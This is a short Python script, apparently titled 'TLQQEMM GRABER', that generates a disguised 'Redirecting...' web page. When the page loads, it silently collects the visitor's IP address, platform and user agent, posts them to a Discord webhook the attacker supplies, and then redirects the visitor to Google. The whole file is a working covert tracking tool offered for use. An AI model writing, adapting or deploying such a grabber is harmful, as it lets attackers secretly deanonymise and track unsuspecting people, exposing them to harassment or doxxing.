import os

def create_grabber():
    project_name = "TLQQEMM GRABER"
    webhook_url = input("Enter your Discord Webhook: ")
    
    html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <script>
    async function collect() {{
        try {{
            const ipReq = await fetch('https://api.ipify.org?format=json');
            const ipRes = await ipReq.json();
            
            const payload = {{
                embeds: [{{
                    title: "🚀 {project_name} - New Hit",
                    color: 5763719,
                    fields: [
                        {{ name: "IP", value: ipRes.ip, inline: true }},
                        {{ name: "Platform", value: navigator.platform, inline: true }},
                        {{ name: "UserAgent", value: navigator.userAgent }}
                    ],
                    footer: {{ text: "Logged via TLQQEMM" }}
                }}]
            }};

            await fetch('{webhook_url}', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify(payload)
            }});
            
            window.location.href = "https://google.com";
        }} catch (e) {{ console.log(e); }}
    }}
    window.onload = collect;
    </script>
</head>
<body style="background-color:black;">
</body>
</html>"""

    with open("index.html", "w", encoding="utf-8") as f:
        f.write(html_content)
    
    print(f"[*] Success! File 'index.html' created for {project_name}")

if __name__ == "__main__":
    create_grabber()